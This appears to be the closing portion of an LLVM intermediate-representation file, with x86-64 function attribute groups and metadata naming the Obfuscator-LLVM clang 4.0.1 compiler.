attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn nounwind }
attributes #12 = { noreturn }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146540370}
!2 = !{i32 -2146539679}
!3 = !{i32 -2146538930}
!4 = !{i32 -2146538220}
!5 = !{i32 -2146537402}
!6 = !{i32 -2146536511}
